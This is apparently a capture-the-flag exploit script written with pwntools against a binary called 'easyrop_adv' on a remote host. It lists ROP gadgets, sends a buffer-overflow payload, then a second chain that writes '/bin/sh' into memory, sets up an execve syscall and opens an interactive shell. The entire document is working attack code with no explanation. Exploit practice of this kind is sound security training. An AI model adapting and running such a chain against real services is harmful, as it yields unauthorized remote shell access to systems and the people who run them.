from pwn import *

#r = gdb.debug('./easyrop_adv')
r = remote("exp.zip", 56014)

'''
0x000000000044fcc7 : pop rax ; ret
0x0000000000401e8f : pop rdi ; ret
0x0000000000409ebe : pop rsi ; ret

0x00000000004503c5 : pop rdx ; or byte ptr [rcx - 0xa], al ; ret
0x0000000000485aeb : pop rdx ; pop rbx ; ret

0x0000000000433403 : mov qword ptr [rdi], rdx ; ret
0x000000000043f5f9 : mov eax, edx ; ret


'''


poprax = p64(0x44fcc7)
poprdi= p64(0x401e8f)
poprsi= p64(0x409ebe)
poprdx= p64(0x485aeb)
mem_addr = p64(0x4c8000)
w2m = p64(0x433403)
syscall = p64(0x44e8d9)

rop =  poprdx
rop += p64(0x400)
rop += p64(0x44e8d9)
rop += p64(0x44e8d9)


rop1 = poprdx
rop1 += b'/bin/sh\x00'
rop1 += p64(0x0)
rop1 += poprdi
rop1 += mem_addr
rop1 += w2m

rop1 += poprax
rop1 += p64(0x3b)

rop1 += poprsi
rop1 += p64(0x0)
rop1 += poprdx
rop1 += p64(0x0)
rop1 += p64(0x0)
rop1 += syscall


payload = b'A'*40 + rop
payload1 = b'B'*72 + rop1

r.recvuntil(b"Data:")
r.sendline(payload)

pause(1)

r.sendline(payload1)

r.interactive()
